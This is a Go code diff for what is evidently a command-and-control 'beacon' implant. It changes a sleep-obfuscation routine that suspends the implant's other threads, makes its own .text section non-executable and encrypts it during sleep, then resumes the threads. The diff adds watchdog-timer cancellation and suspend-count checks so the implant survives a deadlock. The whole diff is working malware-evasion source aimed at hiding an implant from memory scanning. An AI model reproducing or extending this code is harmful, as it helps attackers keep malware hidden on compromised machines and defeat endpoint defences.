@@ -566,16 +566,58 @@ func suspendAndArmPeers(
 // suspended with no drain messages, which is only possible if
 // ResumeThread was returning -1 on the very first call and the drain
 // loop broke without logging.
-// resumeAndCleanupPeers resumes each suspended peer (drain-resume to
-// zero), cancels the watchdog timer that was armed for it, and closes
-// its handle. Called at end of Sleep.
+// cancelWatchdogs cancels every peer's watchdog timer. INVALID_HANDLE_VALUE
+// as CompletionEvent tells DeleteTimerQueueTimer to wait for any in-flight
+// callback — so when this returns, the state of each peer's suspend count
+// is stable (either the watchdog already fired and drained a suspend, or
+// it was cancelled before it could).
 //
-// The watchdog timer for a peer may have already fired (if the sleep
-// deadlocked and was rescued) or may still be pending (normal case).
-// DeleteTimerQueueTimer with INVALID_HANDLE_VALUE handles both:
-// waits for any in-flight callback, and cancels pending ones. Fast in
-// both paths — the callback is one ResumeThread syscall.
-func resumeAndCleanupPeers(cycle uint64, peers []peerState) {
+// Called AFTER the suspend loop returns but BEFORE we do anything else
+// with the peer state (e.g. verifying that all peers are still suspended).
+// Splitting cancel from resume+close makes the abort decision unambiguous:
+// once cancelWatchdogs returns, no timer can fire and un-suspend a peer
+// behind our back.
+func cancelWatchdogs(peers []peerState) {
+	for i := range peers {
+		if peers[i].hTimer != 0 {
+			procDeleteTimerQueueTimer.Call(0, peers[i].hTimer, ^uintptr(0))
+			peers[i].hTimer = 0
+		}
+	}
+}
+
+// verifyAllPeersSuspended queries the kernel suspend count for each
+// peer. Returns (all-suspended, first-unsuspended-tid). If any peer has
+// a count of 0, its watchdog fired during the suspend loop (or Suspend
+// silently failed) — that peer is running and would crash if we
+// entered the encrypted window with `.text` non-executable.
+//
+// Called AFTER cancelWatchdogs, so counts don't change while we check.
+func verifyAllPeersSuspended(peers []peerState) (bool, uint32) {
+	for _, p := range peers {
+		var count uint32
+		var retLen uintptr
+		status, _, _ := procNtQueryInformationThread.Call(
+			uintptr(p.hThread),
+			threadSuspendCount,
+			uintptr(unsafe.Pointer(&count)),
+			unsafe.Sizeof(count),
+			uintptr(unsafe.Pointer(&retLen)),
+		)
+		if status != 0 || count == 0 {
+			return false, p.tid
+		}
+	}
+	return true, 0
+}
+
+// resumeAndClose is the tail cleanup after cancelWatchdogs. Drain-resumes
+// each peer and closes its handle. Both the normal encryption path and
+// the safe-abort path call this at the end.
+//
+// This is what used to be `resumeAndCleanupPeers` minus the timer
+// cancellation, which is now a separate step.
+func resumeAndClose(cycle uint64, peers []peerState) {
 	tids := make([]uint32, 0, len(peers))
 	for _, p := range peers {
 		tids = append(tids, p.tid)
@@ -584,10 +626,9 @@ func resumeAndCleanupPeers(cycle uint64, peers []peerState) {
 
 	failures := 0
 	for _, p := range peers {
-		// Cancel the watchdog first (it may have already fired; that's
-		// fine — its ResumeThread on our target just made our resume
-		// step a no-op for that thread). Blocking cleanup ensures the
-		// timer can't fire between our resume and CloseHandle.
+		// Watchdog timers should already be cancelled by cancelWatchdogs
+		// before this runs. But guard: if hTimer is still set (e.g. an
+		// error path forgot to call cancelWatchdogs), cancel here.
 		if p.hTimer != 0 {
 			procDeleteTimerQueueTimer.Call(0, p.hTimer, ^uintptr(0))
 		}
@@ -790,6 +831,30 @@ func Sleep(sleepMs uint64) error {
 	}
 	dbg("cycle=%d suspend done peers=%d currentTID=%d", cycle, len(peers), currentTID)
 
+	// CANCEL WATCHDOGS + VERIFY STATE BEFORE ENCRYPTION.
+	//
+	// If any per-peer watchdog fired during the suspend loop (i.e. a
+	// P-handoff deadlock happened and was rescued), the affected peer
+	// is now running. Entering the encryption phase — where `.text`
+	// loses its executable bit — while any peer is running would AV
+	// that peer's next instruction fetch and crash the whole process.
+	// (This exact pattern was demonstrated experimentally: manually
+	// resuming stuck peers via Process Hacker unwedged the beacon, but
+	// it crashed a few seconds later once encryption started with the
+	// externally-resumed peers still running.)
+	//
+	// Cancel timers first so their state is stable. Then query each
+	// peer's ThreadSuspendCount. If any is 0, abort — do not encrypt
+	// this cycle. Drain-resume everyone and return. The beacon skips
+	// one cycle of memory obfuscation but survives cleanly.
+	cancelWatchdogs(peers)
+	if allSuspended, badTID := verifyAllPeersSuspended(peers); !allSuspended {
+		dbg("cycle=%d WATCHDOG rescued during suspend loop (tid=%d not suspended) — aborting encryption", cycle, badTID)
+		errorsTotal.Add(1)
+		resumeAndClose(cycle, peers)
+		return nil
+	}
+
 	// SuspendThread is asynchronous — give the kernel a moment to commit
 	// each suspension before we start mutating the image. Without this,
 	// a peer could still be executing an in-flight instruction when we
@@ -811,7 +876,7 @@ func Sleep(sleepMs uint64) error {
 		// and bail. Failing to resume peers here would leave the process
 		// deadlocked with no way out.
 		dbg("cycle=%d QueueUserAPC returned 0", cycle)
-		resumeAndCleanupPeers(cycle, peers)
+		resumeAndClose(cycle, peers)
 		errorsTotal.Add(1)
 		return errors.New("apc: QueueUserAPC failed")
 	}
@@ -835,15 +900,12 @@ func Sleep(sleepMs uint64) error {
 
 	dbg("cycle=%d alertable wait returned", cycle)
 
-	// -------- RESUME PEERS + CANCEL WATCHDOGS --------
+	// -------- RESUME PEERS + CLOSE HANDLES --------
 	// Image is decrypted and executable again; peers are safe to run.
-	// resumeAndCleanupPeers takes the peerState list and:
-	//   - Cancels each watchdog timer (blocking until any in-flight
-	//     callback finishes, so the timer can't fire between our
-	//     drain-resume and CloseHandle).
-	//   - Drain-resumes each peer using the already-open handle.
-	//   - Closes the handle.
-	resumeAndCleanupPeers(cycle, peers)
+	// Watchdogs were already cancelled before we entered encryption
+	// (see cancelWatchdogs above), so this only needs to drain-resume
+	// and close.
+	resumeAndClose(cycle, peers)
 
 	// If our actual sleep duration significantly exceeded the intended
 	// duration, some watchdog timer must have fired to rescue us. This
